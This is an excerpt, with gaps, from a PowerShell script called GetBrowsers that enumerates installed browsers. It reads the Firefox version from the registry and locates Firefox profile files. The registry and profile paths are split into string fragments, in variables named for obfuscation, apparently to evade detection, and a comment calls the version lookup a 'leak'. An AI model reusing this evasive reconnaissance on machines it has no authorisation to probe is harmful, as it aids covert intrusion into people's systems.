...
$host.UI.RawUI.WindowTitle = "@GetBrowsers v1.20.2"
...
function BROWSER_RECON {
    ...
    If($MInvocation -iMatch 'IE'){$id = "True";$fd = "False";$cd = "False";$OP = "False"}
    If($MInvocation -iMatch 'Opera'){$id = "False";$fd = "False";$cd = "False";$OP = "True"}
    If($MInvocation -iMatch 'Chrome'){$id = "False";$fd = "False";$cd = "True";$OP = "False"}
    If($MInvocation -iMatch 'Firefox'){$id = "False";$fd = "True";$cd = "False";$OP = "False"}
    If($MInvocation -iMatch 'MSEdgeHTM'){$id = "True";$fd = "False";$cd = "False";$OP = "False"}
    If(-not($MInvocation) -or $MInvocation -eq $null){$id = "{Null}";$fd = "{Null}";$cd = "{Null}";$OP = "{Null}"}

    ## leak Firefox installed version
    $Obfuc = "HK" + "LM:\Software\Microso" + "ft\Windows\CurrentVersion\Un" + "install\*" -Join ''
    $ParsingData = (gp $Obfuc|Where-Object { $_ -iMatch "firefox" }).DisplayVersion 
...
function FIREFOX {
    ...
    $DefaultOfuscacao = "*.def" + "au`lt" -join ''
    $obff = "$Env:APPDATA\Mozi" + "lla\Fire" + "fox\Profiles" -join ''
    If(Test-Path "$obff"){
        ...
        If(-not(Test-Path "$obff\$DefaultOfuscacao\prefs.js")){
            $FirefoxProfile = "$obff\${DefaultOfuscacao}-release\prefs.js"
            $stupidTrick = $True
        }else{
            $FirefoxProfile = "$obff\$DefaultOfuscacao\prefs.js" 
        }
...
Write-Host ""
Get-Content "$LogFilePath\BrowserEnum.log" | Format-Table -AutoSize | Out-String -Stream | Select-Object -Skip 1 | ForEach-Object {
   $stringformat = If($_ -iMatch '^(Browser|Status)')
   {
      @{ 'ForegroundColor' = 'Green' }
   }
   ElseIf($_ -iMatch '^(Up)' -or $_ -Match '\s+Active+\s')
   { 
